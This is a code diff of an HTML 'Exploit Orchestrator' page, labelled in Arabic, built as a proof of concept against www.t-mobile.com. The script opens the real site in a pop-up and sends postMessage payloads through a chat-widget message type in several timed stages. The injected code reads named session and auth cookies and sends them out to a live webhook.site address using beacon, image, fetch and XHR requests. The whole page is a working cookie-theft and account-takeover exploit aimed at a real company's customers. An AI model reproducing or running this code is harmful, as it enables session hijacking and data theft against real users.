@@ -1,88 +1,102 @@
 <!doctype html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Security Research PoC - T-Mobile ATO</title>
+    <title>Multi-Stage Attack PoC</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #000; color: #fff; text-align: center; padding: 100px; }
-        .container { border: 2px solid #e20074; padding: 50px; border-radius: 20px; display: inline-block; box-shadow: 0 0 20px #e20074; }
-        h1 { color: #e20074; margin-bottom: 10px; }
-        p { color: #888; margin-bottom: 30px; }
-        .btn { background-color: #e20074; color: white; border: none; padding: 15px 40px; font-size: 1.2rem; border-radius: 5px; cursor: pointer; transition: 0.3s; }
-        .btn:hover { background-color: #ff0084; transform: scale(1.05); }
-        #status { margin-top: 20px; font-weight: bold; color: #00ff00; }
+        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; padding: 50px; text-align: center; }
+        .terminal { background: #1a1a1a; border: 1px solid #333; padding: 30px; border-radius: 10px; display: inline-block; max-width: 80%; box-shadow: 0 0 20px rgba(0,255,0,0.2); }
+        .log-line { text-align: left; margin: 10px 0; font-size: 0.9rem; border-bottom: 1px solid #222; }
+        .btn { background: #e20074; color: white; border: none; padding: 15px 40px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 20px; }
+        .btn:hover { background: #ff0084; }
+        .highlight { color: #ff0084; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>T-Mobile Critical Vulnerability PoC</h1>
-    <p>Target Domain: <strong>www.t-mobile.com</strong></p>
-    <button class="btn" onclick="startExploit()">تشغيل الهجوم التلقائي</button>
-    <div id="status">جاهز للإرسال...</div>
+<div class="terminal">
+    <h1><span class="highlight">T-Mobile</span> Exploit Orchestrator</h1>
+    <p>سيتم تجربة كافة طرق الحقن والتسريب بالتتابع...</p>
+    <button class="btn" onclick="runAttackChain()">إطلاق سلسلة الهجوم</button>
+    
+    <div id="logs">
+        <div class="log-line">> نظام الهجوم جاهز...</div>
+    </div>
 </div>
 
 <script>
-    function startExploit() {
-        const statusDiv = document.getElementById('status');
-        const webhookURL = "https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f"; // ضع الرابط الخاص بك هنا
+    const webhook = "https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f"; // استبدل بـ ID الخاص بك
 
-        statusDiv.innerText = "جاري فتح نافذة الضحية...";
-        
-        // 1. فتح نافذة الهدف
+    function log(msg) {
+        const div = document.createElement('div');
+        div.className = 'log-line';
+        div.innerText = `[${new Date().toLocaleTimeString()}] > ${msg}`;
+        document.getElementById('logs').appendChild(div);
+    }
+
+    async function runAttackChain() {
+        log("فتح نافذة الضحية...");
         const victimWin = window.open('https://www.t-mobile.com/', '_blank');
 
         if (!victimWin) {
-            statusDiv.style.color = "red";
-            statusDiv.innerText = "خطأ: المتصفح منع النوافذ المنبثقة!";
+            log("خطأ: يرجى تفعيل Pop-ups!");
             return;
         }
 
-        statusDiv.innerText = "انتظار تحميل السكربتات (15 ثانية)...";
-
-        // 2. كود الـ Payload الذي سيعمل داخل T-Mobile
-        // تم استخدام navigator.sendBeacon لتخطي الـ Service Worker
+        // --- المرحلة 1: تحضير الكود الخبيث (The Payload) ---
         const payloadCode = `() => {
             try {
-                // تجميع الكوكيز الحساسة فقط لضمان الحجم
                 const k = ['a_token', 'TFPID', 'LPVID', 'TMUT'];
-                const cookies = document.cookie.split('; ').filter(c => k.some(n => c.startsWith(n))).join('|');
-                
-                // تسريب البيانات فوراً عبر Beacon (Silent Exfiltration)
-                const leakData = {
-                    cookies: cookies,
-                    origin: location.origin,
-                    path: location.pathname,
-                    ts: Date.now()
-                };
-                
-                navigator.sendBeacon('${webhookURL}/?leak=' + btoa(JSON.stringify(leakData)));
-                
-                console.log("%c [!] Data Exfiltrated Successfully", "color: red; font-weight: bold;");
+                const d = document.cookie.split('; ').filter(c => k.some(n => c.startsWith(n))).join('|');
+                const exfilUrl = "${webhook}/?leak=" + btoa(d);
+
+                // تجربة كافة طرق التسريب بالتتابع
+                // 1. Beacon
+                navigator.sendBeacon(exfilUrl + "&method=beacon");
+
+                // 2. Image Fetch
+                new Image().src = exfilUrl + "&method=image";
+
+                // 3. Native Fetch
+                fetch(exfilUrl + "&method=fetch", {mode:'no-cors', cache:'no-cache'});
+
+                // 4. XHR
+                var x = new XMLHttpRequest();
+                x.open("GET", exfilUrl + "&method=xhr", true);
+                x.send();
+
+                console.log("Exfiltration attempts finished.");
             } catch(e) {
-                // في حالة الفشل، سيتم التقاط الخطأ بواسطة Phoenix/Quantum وإرساله أيضاً
-                throw new Error("CriticalChain:" + document.cookie);
+                // محاولة أخيرة عبر Error Stack لو فشل كل ما سبق
+                new Image().src = "${webhook}/?error=" + encodeURIComponent(e.message);
             }
             return 'LPExternalWindowClosed';
         }`;
 
-        // 3. إرسال الـ Exploit بعد استقرار الصفحة
-        setTimeout(() => {
-            statusDiv.innerText = "جاري حقن الـ Payload في الـ DOM...";
-            
-            const message = {
-                "type": "LPExternalWindowClosed",
-                "details": {
-                    "toString": payloadCode
-                },
-                "source": "secureStorage"
-            };
+        const attackData = {
+            "type": "LPExternalWindowClosed",
+            "details": { "toString": payloadCode },
+            "source": "secureStorage"
+        };
 
-            // إرسال الكائن كـ JSON String لضمان المعالجة من قبل Listener الموقع
-            victimWin.postMessage(JSON.stringify(message), "*");
-            
-            statusDiv.innerText = "تم إرسال الهجوم! تحقق من Webhook الآن.";
-        }, 30000);
+        // --- المرحلة 2: محاولة الإرسال كـ String بعد 15 ثانية ---
+        setTimeout(() => {
+            log("المرحلة 2: محاولة الحقن عبر String Payload...");
+            victimWin.postMessage(JSON.stringify(attackData), "*");
+        }, 15000);
+
+        // --- المرحلة 3: محاولة الإرسال كـ Object بعد 18 ثانية ---
+        setTimeout(() => {
+            log("المرحلة 3: محاولة الحقن عبر Object Payload (التفاف على JSON.parse)...");
+            victimWin.postMessage(attackData, "*");
+        }, 18000);
+
+        // --- المرحلة 4: محاولة الحقن المباشر في الـ DOM (لو أمكن) بعد 22 ثانية ---
+        setTimeout(() => {
+            log("المرحلة 4: محاولة إرسال Payload مبسط جداً...");
+            victimWin.postMessage('{"type":"LPExternalWindowClosed", "details": {"toString": "'+payloadCode+'"}}', "*");
+            log("سلسلة الهجوم اكتملت. افحص الـ Webhook.");
+        }, 22000);
     }
 </script>
 
